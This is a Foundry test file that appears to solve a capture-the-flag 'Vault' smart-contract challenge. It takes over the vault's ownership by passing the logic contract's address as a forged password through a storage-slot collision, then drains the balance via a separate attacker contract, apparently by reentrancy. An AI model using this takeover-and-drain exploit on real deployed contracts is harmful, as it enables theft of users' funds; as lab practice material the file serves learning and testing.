// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/testDeposit.sol";


contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);
        console.log("player", palyer);
        AttackBank attacker = new AttackBank(address(vault), palyer);
        vm.deal(address(attacker), 0.1 ether);

        bytes32 fakePassword = bytes32(uint256(uint160(address(logic))));

        console.logBytes32(fakePassword);

        (bool success, ) = address(vault).call(
            abi.encodeWithSignature("changeOwner(bytes32,address)", fakePassword, palyer)
        );
        require(success, "changeOwner failed");
        assertEq(vault.owner(), palyer);
        vault.openWithdraw();
        vm.stopPrank();

        uint256 balance = address(vault).balance;


        vm.startPrank(address(attacker));
        vault.deposite{value: 0.01 ether}();
        vault.withdraw();
        vm.stopPrank();
        assertEq(balance, address(attacker).balance-balance);
        
        vm.startPrank(palyer);
        attacker.withdraw();
        vm.stopPrank();


        console.log("playbalcane",palyer.balance);
        console.log(vault.isSolve());

    }

}
